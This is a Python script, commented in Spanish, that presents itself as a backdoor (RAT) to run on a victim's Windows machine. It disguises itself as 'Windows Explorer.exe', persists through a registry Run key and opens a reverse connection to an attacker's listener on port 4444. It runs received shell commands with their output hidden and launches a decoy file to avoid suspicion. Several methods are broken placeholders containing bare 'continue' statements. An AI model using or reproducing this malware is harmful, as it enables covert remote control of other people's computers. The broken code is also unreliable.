#!/usr/bin/env python3

"""
    Crea un apuerta trasera para controlar un equipo remoto RAT
    Este script se tiene que ejecutar en la máquina víctima
    Preparamos un puerto local para recibir peticiones
    $ nc -vv -l -p 4444
"""


import socket
import subprocess
import os
import sys
import shutil


class BackDoor:
    def __init__(self, ip, port):
        self.arrancar_al_inicio()
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.connect((ip, port))

    def arrancar_al_inicio(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            # Comando para añadir en el registro de arranque de Windows
            subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update REG_SZ /d "' + evil_file_location + '"', self=True)

    def do(self, command):
        # Fichero que almacenará la salida del script para que no se
        # muestre en el prompt
        DEVNULL = open(os.DEVNULL, 'wb')
        # Ejecutamos el comando, indicando donde pintar la salida
        return subprocess.check_output(command, shell=True,
                                       stderr=DEVNULL, stdin=DEVNULL)
        # Ejececución del comando estandart, pinta en el prompt
        # return subprocess.check_output(command, shell=True)
        # Mandar un paquete
        self.con.send("\n\t[+] Conection stablished\n")

    def cd(self, path):
        continue

    def write_file(self, path):
        continue

    def write_file(self, path, bytes):
        continue

    def start(self):
        while True:
            # Recibir un paquete (de tamaño máximo 1024)
            recieved_data = self.con.recv(1024)
            done = self.do(recieved_data)
            self.con.send(done)

        self.con.close()
        sys.exit()

    def send(self, data):
        continue

    def wait(self):
        continue


file_name = sys._MEIPASS + "\NotSuspectFile.txt"
subprocess.Popen(file_name, shell=True)

# Controlamos los errores para que no se muestren los errores al cliente
try:
    bdoor = BackDoor("MiIp", 4444)
    bdoor.start()
except Exception:
    # Capturamos todos los errores
    continue
